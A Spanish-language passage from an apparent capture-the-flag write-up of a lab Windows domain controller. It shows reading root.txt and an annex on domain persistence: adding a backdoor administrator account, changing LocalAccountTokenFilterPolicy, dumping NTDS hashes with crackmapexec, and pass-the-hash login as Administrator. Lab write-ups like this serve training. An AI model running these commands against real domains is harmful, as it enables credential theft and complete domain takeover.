Aunque la segunda flag ha sido alcanzada, para conseguir una **persistencia robusta en el dominio** se recomienda consultar el [primer punto del Anexo](#anexo-i-volcado-del-ntds-para-persistencia-en-el-dominio). En él, se detalla cómo **volcar la base de datos NTDS** para obtener los hashes NT de todos los usuarios del dominio, lo que permitiría un control total sobre las cuentas de usuario del dominio.

### root.txt

La segunda flag se encuentra en el directorio **Desktop** del usuario **Administrator**:

```powershell
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
d51176deda2ebf***1908f0fe0db6e35
```

## Anexo I: Volcado del NTDS para Persistencia en el Dominio

El NTDS (New Technology Directory Service) es un componente esencial de la infraestructura de Active Directory (AD) en un servidor Windows. Contiene toda la información sobre los objetos en un dominio, incluyendo los datos de los usuarios, grupos, contraseñas (en forma de hashes), y más. Para un atacante, obtener un volcado del NTDS puede proporcionar un control total y persistente sobre todas las cuentas de usuario en un dominio.

Empezamos este procedimiento a partir de la shell ganada como `SYSTEM` en la explotación del grupo `DnsAdmins` en la resolución de la máquina. Una vez obtenida esta shell de alto privilegio, se puede crear un nuevo usuario y añadirlo al grupo `Administrators`. Esto se puede lograr con los siguientes comandos:

```powershell
C:\Windows\system32> net user fran fran123$! /add
C:\Windows\system32> net localgroup "Administrators" fran /add
```
El primer comando `net user fran fran123$! /add` crea un nuevo usuario llamado `fran` con contraseña `fran123$!`. El segundo comando `net localgroup "Administrators" fran /add` agrega al usuario `fran` al grupo local `Administrators`.

Además, es necesario modificar un registro específico `LocalAccountTokenFilterPolicy`. Este registro controla cómo se gestionan los tokens de acceso en un sistema con UAC (User Account Control). Al asignarle un valor de `1`, se permite que las cuentas locales (en este caso, `fran`) puedan ejecutar comandos con privilegios elevados de forma remota:

```powershell
C:\Windows\system32> cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 
```

Una vez se ha agregado el usuario `fran` al grupo `Administrators` y modificado el registro `LocalAccountTokenFilterPolicy`, se puede proceder a volcar el NTDS. En este caso, se utilizará la herramienta `crackmapexec` con el módulo `smb`:

```shell
r1pfr4n@parrot> crackmapexec smb 10.10.10.169 -u 'fran' -p 'fran123$!' --ntds
```
En este comando, `-u 'fran'` y `-p 'fran123$!'` especifican el nombre de usuario y la contraseña del usuario `fran`. El argumento `--ntds` indica a `crackmapexec` que realice el volcado del NTDS.

El resultado de este comando es un volcado del NTDS. La imagen a continuación muestra el resultado de la ejecución del comando, señalando en rojo la línea perteneciente al usuario `Administrator` del dominio:

![imagen 2](Pasted image 20230726185327.png)

Cada línea en el volcado del NTDS se compone de la siguiente manera:

```
NombreDeUsuario:RID:HashLM:HashNT:::
```

En este formato, `NombreDeUsuario` es el nombre del usuario, `RID` es el Identificador Relativo, `HashLM` es el hash Lan Manager (obsoleto y común a todos los usuarios), y `HashNT` es el hash NT, que es único para cada usuario.

Es importante destacar que el `HashNT` es el componente clave aquí. Es con este hash que se puede realizar un ataque Pass-The-Hash (PtH). PtH es una técnica de ataque que permite a un atacante autenticarse en un recurso de red sin conocer la contraseña del usuario de la cuenta que está utilizando, sino solo el hash. En contraste, el `HashLM` no es útil para un ataque PtH debido a su naturaleza obsoleta y a la compatibilidad con versiones antiguas de Windows.

Con el hash NT del usuario `Administrator` (en este caso, `fb3b106896cdaa8a08072775fbd9afe9`), el atacante puede establecer una conexión WinRM como `Administrator` o ejecutar comandos remotamente como este usuario utilizando herramientas como `psexec.py` o `smbexec.py`.

Conexión por WinRM como Administrator:

![imagen 2](Pasted image 20230727183217.png)

De esta manera, obteniendo el NTDS y los hashes NT, se consigue una **persistencia robusta en el dominio**, asegurando un control total sobre las cuentas de usuario del dominio.



